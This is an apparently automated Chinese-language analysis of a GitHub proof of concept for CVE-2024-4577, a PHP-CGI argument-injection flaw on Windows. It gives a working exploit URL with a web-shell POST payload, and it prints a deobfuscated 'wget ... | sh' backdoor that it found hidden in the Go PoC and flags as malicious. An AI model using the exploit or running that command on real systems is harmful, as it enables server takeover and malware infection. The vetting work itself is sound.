## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI模式，特定代码页)

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统配置使用了特定的代码页，允许"Best Fit"字符转换。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2024-4577 漏洞允许攻击者通过在URL中注入恶意参数来执行任意PHP代码。该漏洞存在于PHP的CGI实现中，当PHP运行在Windows服务器上，并且启用了"Best Fit"字符转换时，攻击者可以利用此漏洞。

**有效性:**

提供的漏洞利用代码（Go和Python）尝试通过在URL中注入`allow_url_include`和`auto_prepend_file`参数来包含远程文件或执行PHP代码。具体来说，它尝试设置`allow_url_include=1`并使用`auto_prepend_file`包含`php://input`，然后通过POST请求发送PHP代码（`<?php phpinfo(); ?>`）。如果服务器存在漏洞，则会执行`phpinfo()`函数，从而验证漏洞的存在。

根据漏洞描述和提供的代码，利用方式是有效的，可以在目标系统上执行任意PHP代码。

**投毒风险:**

*   **Go代码分析:**

    在Go代码中，存在一个名为`nFPfVl()`的函数，该函数包含混淆的代码，用于执行shell命令。通过反混淆字符串，可以发现该函数执行从某个URL下载文件并执行的操作，这表明存在潜在的投毒风险。

    `TcGEZTIh`变量反混淆后为: `wget -qO- http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33 | sh`

    这意味着该PoC会尝试从`http://tvhgw/kaifre/O-0asbd|e/bpdc/ /c /3nadeag5 -t6 uo/tat.fe33` 下载文件并使用sh执行，存在恶意行为。

*   **Python代码分析:**
    Python代码的功能比较简单，就是发送payload进行验证，没有发现明显的投毒代码。

综合来看，Go代码存在明显的投毒风险，Python代码未发现。

**利用方式:**

1.  **目标环境:** 攻击者需要找到运行在Windows服务器上的，并且使用CGI模式的，以及存在漏洞版本的PHP应用。
2.  **构造恶意URL:** 攻击者构造包含恶意参数的URL。例如：`example.com/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input`。
3.  **发送包含PHP代码的POST请求:** 攻击者通过POST请求将PHP代码发送到服务器。`<?php system($_GET['cmd']); ?>`
4.  **远程代码执行:** 服务器执行POST请求中的PHP代码，从而允许攻击者执行任意系统命令。

攻击者可以利用该漏洞读取服务器上的文件，执行任意代码，甚至完全控制服务器。

**项目地址:** [creamylegum/CVE-2024-4577-PHP-RCE](https://github.com/creamylegum/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)